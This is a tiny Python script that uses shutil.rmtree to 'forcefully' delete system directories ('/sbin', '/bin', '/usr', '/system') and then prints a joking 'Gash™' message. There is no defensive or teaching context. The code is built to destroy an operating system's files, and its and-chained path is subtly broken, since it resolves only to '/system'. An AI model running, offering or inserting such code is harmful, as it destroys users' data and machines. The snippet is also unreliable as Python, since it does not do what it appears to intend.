import shutil

folder_path = "/sbin" and "/bin" and "/usr" and "/system"

# Forcefully remove the directory and everything inside
shutil.rmtree(folder_path)

print(f"{folder_path} Gash™")
